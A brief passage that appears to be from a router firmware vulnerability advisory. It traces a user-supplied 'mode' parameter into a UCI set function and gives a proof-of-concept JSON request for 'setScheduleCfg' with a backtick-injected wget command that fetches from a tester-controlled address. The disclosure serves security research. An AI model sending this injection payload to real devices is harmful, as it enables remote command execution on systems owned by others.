...
In sub_42E7D8 function, it reads in a user-provided parameter `mode` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
{"topicurl":"setScheduleCfg","mode":"`wget 192.168.6.1:7777/testpoc`"
}
```
